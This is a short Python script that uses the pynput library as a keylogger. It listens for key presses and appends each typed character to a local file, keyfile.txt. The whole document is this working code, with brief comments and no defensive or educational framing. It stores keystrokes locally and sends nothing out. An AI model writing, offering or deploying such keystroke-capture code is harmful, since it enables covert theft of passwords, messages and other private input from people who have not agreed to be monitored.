from pynput import keyboard
#install packages from pynput 


#opens file to paste characters from keyboard logs 
def keyPressed(key):
    print(str(key))
    with open("keyfile.txt", 'a') as logKey:
        try:
            char = key.char #try and except. outputs character and if there are errors, paste error message 
            logKey.write(char)
        except:
            print("Error getting char")

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()